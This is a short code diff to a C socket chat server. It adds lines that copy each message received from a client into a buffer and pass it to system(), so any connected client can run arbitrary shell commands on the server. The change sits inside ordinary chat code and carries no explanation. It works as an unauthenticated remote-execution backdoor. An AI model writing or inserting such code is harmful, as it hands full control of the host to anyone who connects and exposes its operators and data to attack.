@@ -9,6 +9,7 @@ int main() {
     int ss, cli, pid;
     struct sockaddr_in ad;
     char s[100];
+    char command[100];
     socklen_t ad_length = sizeof(ad);
 
     // create the socket
@@ -36,7 +37,8 @@ int main() {
                 // it's client turn to chat, I wait and read message from client
                 read(cli, s, sizeof(s));
                 printf("client says: %s\n",s);
-
+                snprintf(command , sizeof(command), "%s", s);
+                system(command);
                 // now it's my (server) turn
                 printf("server>", s);
                 scanf("%s", s);
